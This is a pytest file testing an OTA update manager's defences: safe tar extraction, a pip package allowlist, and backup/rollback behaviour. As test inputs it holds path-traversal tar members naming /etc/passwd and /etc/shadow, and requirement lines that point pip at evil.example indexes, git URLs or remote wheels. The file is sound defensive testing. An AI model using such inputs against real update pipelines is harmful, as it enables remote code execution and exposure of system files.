"""
OTA Update Security Tests

Tests for path traversal protection and package whitelist validation
in the satellite OTA update manager.
"""

import io
import shutil
import tarfile
import tempfile
from pathlib import Path

import pytest
from unittest.mock import patch, MagicMock

from renfield_satellite.update.update_manager import (
    UpdateError,
    UpdateManager,
)


# ============================================================================
# Path Traversal Protection Tests (_safe_extract)
# ============================================================================


class TestSafeExtract:
    """Tests for _safe_extract() path traversal prevention"""

    @pytest.fixture
    def update_manager(self, tmp_path):
        """Create an UpdateManager with temp paths"""
        install_path = tmp_path / "install"
        install_path.mkdir()
        (install_path / "renfield_satellite").mkdir()
        return UpdateManager(
            install_path=str(install_path),
            backup_path=str(tmp_path / "backup"),
        )

    @pytest.fixture
    def extract_dir(self):
        """Create a temporary extraction directory"""
        path = tempfile.mkdtemp()
        yield path
        shutil.rmtree(path, ignore_errors=True)

    @pytest.mark.satellite
    def test_path_traversal_relative_rejected(self, update_manager, extract_dir):
        """Test: Tarfile member with ../../../etc/passwd raises UpdateError"""
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tar:
            info = tarfile.TarInfo(name="../../../etc/passwd")
            info.size = 5
            tar.addfile(info, io.BytesIO(b"hello"))
        buf.seek(0)

        from pathlib import Path

        with tarfile.open(fileobj=buf, mode="r:gz") as tar:
            with pytest.raises(UpdateError, match="Path traversal"):
                update_manager._safe_extract(tar, Path(extract_dir))

    @pytest.mark.satellite
    def test_path_traversal_absolute_rejected(self, update_manager, extract_dir):
        """Test: Tarfile member with absolute path /etc/shadow raises UpdateError"""
        from pathlib import Path

        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tar:
            info = tarfile.TarInfo(name="/etc/shadow")
            info.size = 5
            tar.addfile(info, io.BytesIO(b"hello"))
        buf.seek(0)

        with tarfile.open(fileobj=buf, mode="r:gz") as tar:
            with pytest.raises(UpdateError, match="Path traversal"):
                update_manager._safe_extract(tar, Path(extract_dir))

    @pytest.mark.satellite
    def test_normal_file_extracts_successfully(self, update_manager, extract_dir):
        """Test: Normal tarfile with renfield_satellite/main.py extracts OK"""
        from pathlib import Path

        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tar:
            info = tarfile.TarInfo(name="renfield_satellite/main.py")
            content = b"# main module\n"
            info.size = len(content)
            tar.addfile(info, io.BytesIO(content))
        buf.seek(0)

        extract_path = Path(extract_dir)
        with tarfile.open(fileobj=buf, mode="r:gz") as tar:
            update_manager._safe_extract(tar, extract_path)

        # Verify the file was actually extracted
        extracted_file = extract_path / "renfield_satellite" / "main.py"
        assert extracted_file.exists()
        assert extracted_file.read_text() == "# main module\n"


# ============================================================================
# Package Whitelist Validation Tests (_install_requirements)
# ============================================================================


class TestInstallRequirements:
    """Tests for _install_requirements() package whitelist validation"""

    @pytest.fixture
    def update_manager(self, tmp_path):
        """Create an UpdateManager with temp paths"""
        install_path = tmp_path / "install"
        install_path.mkdir()
        (install_path / "renfield_satellite").mkdir()
        return UpdateManager(
            install_path=str(install_path),
            backup_path=str(tmp_path / "backup"),
        )

    @pytest.mark.satellite
    @patch("subprocess.run")
    def test_valid_packages_pass_validation(self, mock_run, update_manager, tmp_path):
        """Test: Requirements with whitelisted packages pass validation"""
        mock_run.return_value = MagicMock(returncode=0)

        req_file = tmp_path / "requirements.txt"
        req_file.write_text("websockets>=10.0\naiohttp\n")

        # Should not raise
        update_manager._install_requirements(req_file)

        # Verify pip was called
        mock_run.assert_called_once()
        call_args = mock_run.call_args
        assert "pip" in call_args[0][0]
        assert "--no-deps" in call_args[0][0]

    @pytest.mark.satellite
    @patch("subprocess.run")
    def test_unknown_packages_rejected(self, mock_run, update_manager, tmp_path):
        """Test: Requirements with unknown packages raise UpdateError"""
        req_file = tmp_path / "requirements.txt"
        req_file.write_text("evil-package==1.0\n")

        with pytest.raises(UpdateError, match="Unknown packages"):
            update_manager._install_requirements(req_file)

        # pip should NOT have been called
        mock_run.assert_not_called()

    @pytest.mark.satellite
    @patch("subprocess.run")
    def test_mixed_packages_rejected(self, mock_run, update_manager, tmp_path):
        """Test: Mix of valid and invalid packages still raises UpdateError"""
        req_file = tmp_path / "requirements.txt"
        req_file.write_text("websockets>=10.0\nevil-package==1.0\naiohttp\n")

        with pytest.raises(UpdateError, match="Unknown packages"):
            update_manager._install_requirements(req_file)

        mock_run.assert_not_called()

    @pytest.mark.satellite
    @patch("subprocess.run")
    def test_shipped_requirements_pass_validation(self, mock_run, update_manager):
        """The REAL src/satellite/requirements.txt must pass the whitelist.

        Regression guard for the OTA outage: soundcard / pymicro-wakeword /
        pyopen-wakeword / bleak were missing from SAFE_PACKAGES and RPi.GPIO
        failed dot-normalization, so the installer rejected the satellite's own
        deps and rolled every update back. This ties the whitelist to the actual
        shipped requirements so they can't drift apart again.
        """
        mock_run.return_value = MagicMock(returncode=0)
        req_file = (
            Path(__file__).resolve().parents[2]
            / "src" / "satellite" / "requirements.txt"
        )
        assert req_file.exists(), f"shipped requirements not found at {req_file}"

        # Must not raise — every uncommented dep is whitelisted.
        update_manager._install_requirements(req_file)
        mock_run.assert_called_once()

    @pytest.mark.satellite
    @patch("subprocess.run")
    def test_rpi_gpio_and_inline_comments_pass(self, mock_run, update_manager, tmp_path):
        """RPi.GPIO (dot) + inline comments must not trip the whitelist."""
        mock_run.return_value = MagicMock(returncode=0)
        req_file = tmp_path / "requirements.txt"
        req_file.write_text(
            "RPi.GPIO>=0.7.1  # GPIO for button\n"
            "soundcard>=0.4.0  # capture\n"
            "pymicro-wakeword>=2.0.0\n"
            "bleak>=0.22.0\n"
        )
        update_manager._install_requirements(req_file)
        mock_run.assert_called_once()

    @pytest.mark.satellite
    @patch("subprocess.run")
    def test_separator_impersonation_rejected(self, mock_run, update_manager, tmp_path):
        """A name with injected separators must NOT collapse onto a whitelisted one.

        PEP 503 collapses runs of -_. to a single '-', so `s.o.u.n.d.c.a.r.d`
        canonicalizes to `s-o-u-n-d-c-a-r-d` — a DISTINCT PyPI project from
        `soundcard`, not a match. Deleting separators (the first cut at this fix)
        would have let an attacker register that project and get OTA RCE.
        """
        for evil in ("s.o.u.n.d.c.a.r.d==9.9.9\n", "s-o-u-n-d-c-a-r-d==9.9.9\n",
                     "n.u.m.p.y==9.9.9\n"):
            req_file = tmp_path / "requirements.txt"
            req_file.write_text(evil)
            with pytest.raises(UpdateError, match="Unknown packages"):
                update_manager._install_requirements(req_file)
        mock_run.assert_not_called()

    @pytest.mark.satellite
    @patch("subprocess.run")
    def test_pip_option_lines_rejected(self, mock_run, update_manager, tmp_path):
        """`--index-url`/`-e`/`-r` lines must be rejected, not silently skipped.

        pip honours options inside a `-r` file, so a skipped `--index-url` could
        repoint the whole install at an attacker index even with legit names.
        """
        for evil in ("--index-url https://evil.example/simple\nnumpy==1.0\n",
                     "--extra-index-url https://evil/simple\n",
                     "-e git+https://evil/x.git#egg=numpy\n"):
            req_file = tmp_path / "requirements.txt"
            req_file.write_text(evil)
            with pytest.raises(UpdateError):
                update_manager._install_requirements(req_file)
        mock_run.assert_not_called()

    @pytest.mark.satellite
    @patch("subprocess.run")
    def test_direct_url_reference_rejected(self, mock_run, update_manager, tmp_path):
        """`pkg @ https://…` must fail the allowlist (URL kept in the token)."""
        req_file = tmp_path / "requirements.txt"
        req_file.write_text("soundcard @ https://evil.example/x.whl\n")
        with pytest.raises(UpdateError, match="Unknown packages"):
            update_manager._install_requirements(req_file)
        mock_run.assert_not_called()


# ============================================================================
# SAFE_PACKAGES Whitelist Tests
# ============================================================================


class TestSafePackagesWhitelist:
    """Tests for the SAFE_PACKAGES constant"""

    @pytest.mark.satellite
    def test_whitelist_contains_expected_packages(self):
        """Test: SAFE_PACKAGES contains all expected core satellite packages"""
        expected = [
            "websockets",
            "aiohttp",
            "numpy",
            "openwakeword",
            "psutil",
            "pyyaml",
            "zeroconf",
            "pyaudio",
        ]
        for pkg in expected:
            assert pkg in UpdateManager.SAFE_PACKAGES, (
                f"Expected '{pkg}' in SAFE_PACKAGES"
            )

    @pytest.mark.satellite
    def test_whitelist_is_frozenset(self):
        """Test: SAFE_PACKAGES is a frozenset (immutable)"""
        assert isinstance(UpdateManager.SAFE_PACKAGES, frozenset)

    @pytest.mark.satellite
    def test_whitelist_does_not_contain_dangerous_packages(self):
        """Test: SAFE_PACKAGES does not contain obviously dangerous packages"""
        dangerous = ["pip", "setuptools", "requests", "paramiko", "cryptography"]
        for pkg in dangerous:
            assert pkg not in UpdateManager.SAFE_PACKAGES, (
                f"'{pkg}' should not be in SAFE_PACKAGES"
            )


# ============================================================================
# Backup / Rollback Safety Tests (_create_backup, _rollback)
# ============================================================================


class TestBackupRollback:
    """A failed update must roll back the CODE without nuking venv/config.

    Regression guard for the prod incident: the backup lived at
    install_path/.backup and the rollback rmtree'd the whole install_path —
    deleting the venv (never backed up) and the backup itself, leaving an empty
    install dir. The satellite only survived because its old process was still in
    memory; a reboot would have bricked it.
    """

    def _make_install(self, tmp_path, version="1.0.0"):
        install = tmp_path / "renfield-satellite"
        (install / "renfield_satellite").mkdir(parents=True)
        (install / "renfield_satellite" / "__init__.py").write_text(
            f'__version__ = "{version}"\n'
        )
        (install / "requirements.txt").write_text("websockets>=12.0\n")
        # The pieces the update must NOT touch:
        (install / "venv" / "bin").mkdir(parents=True)
        (install / "venv" / "bin" / "python").write_text("#!/bin/sh\n")
        (install / "config").mkdir()
        (install / "config" / "satellite.yaml").write_text("id: sat-test\n")
        return install

    @pytest.mark.satellite
    def test_backup_lives_outside_install_path(self, tmp_path):
        """The backup must NOT be created inside install_path."""
        install = self._make_install(tmp_path)
        mgr = UpdateManager(install_path=str(install))
        assert install not in mgr.backup_path.parents, (
            f"backup {mgr.backup_path} is inside install {install}"
        )
        mgr._create_backup()
        assert (mgr.backup_path / "renfield_satellite" / "__init__.py").exists()
        # venv must NOT be in the backup (we don't copy it) ...
        assert not (mgr.backup_path / "venv").exists()

    @pytest.mark.satellite
    def test_rollback_restores_code_and_preserves_venv_config(self, tmp_path):
        """Rollback restores old code AND leaves venv + config intact."""
        install = self._make_install(tmp_path, version="1.0.0")
        mgr = UpdateManager(install_path=str(install))
        mgr._create_backup()

        # Simulate a half-applied update: new code copied, venv/config still there.
        (install / "renfield_satellite" / "__init__.py").write_text('__version__ = "2.0.0"\n')

        mgr._rollback()

        # Code reverted ...
        assert '1.0.0' in (install / "renfield_satellite" / "__init__.py").read_text()
        # ... and the things the update never touched survived.
        assert (install / "venv" / "bin" / "python").exists()
        assert (install / "config" / "satellite.yaml").exists()

    @pytest.mark.satellite
    def test_rollback_without_backup_is_noop(self, tmp_path):
        """No backup → rollback leaves the install untouched (no rmtree)."""
        install = self._make_install(tmp_path)
        mgr = UpdateManager(install_path=str(install))
        # No _create_backup() called.
        mgr._rollback()
        assert (install / "venv" / "bin" / "python").exists()
        assert (install / "renfield_satellite" / "__init__.py").exists()
